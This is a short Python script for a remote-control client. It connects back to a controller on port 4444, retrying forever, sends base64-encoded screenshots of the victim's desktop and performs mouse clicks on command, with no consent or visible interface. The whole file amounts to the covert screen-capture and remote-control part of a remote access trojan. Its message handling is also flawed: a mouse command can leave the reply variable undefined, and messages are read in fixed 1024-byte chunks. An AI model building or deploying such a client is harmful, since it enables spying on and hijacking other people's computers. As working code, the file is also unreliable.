import pyautogui
import socket
import base64
import json
import time
import os

class VNCClient:
    def __init__(self, ip, port):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:
            try:
                self.client.connect((ip, port))
                break
            except:
                time.sleep(5)
    
    def mouse_active(self, mouse_flag, x, y):
        if mouse_flag == 'mouse_left_click':
            pyautogui.leftClick(int(x), int(y))
            return 'mouse_left_click'
        elif mouse_flag == 'mouse_right_click':
            pyautogui.rightClick(int(x), int(y))
            return 'mouse_right_click'
        elif mouse_flag == 'mouse_double_left_click':
            pyautogui.doubleClick(int(x), int(y))
            return 'mouse_double_left_click'

    def screen_handler(self):
        pyautogui.screenshot('1.png')
        with open('1.png', 'rb') as file:
            reader = base64.b64encode(file.read())
        os.remove('1.png')
        return reader
    
    def execute_handler(self):
        while True:
            response = self.receive_json()
            if response[0] == 'screen':
                result = self.screen_handler()
            elif 'mouse' in response[0]:
                self.mouse_active(response[0], response[1], response[2])
            self.send_json(result)

    def receive_json(self):
        json_data = ''
        while True:
            try:
                json_data = self.client.recv(1024).decode()
                return json.loads(json_data)
            except:
                pass

    def send_json(self, data):
        try:
            json_data = json.dumps(data.decode())
        except:
            json_data = json.dumps(data)
        self.client.send(json_data.encode())

client = VNCClient('127.0.0.1', 4444)
client.execute_handler()
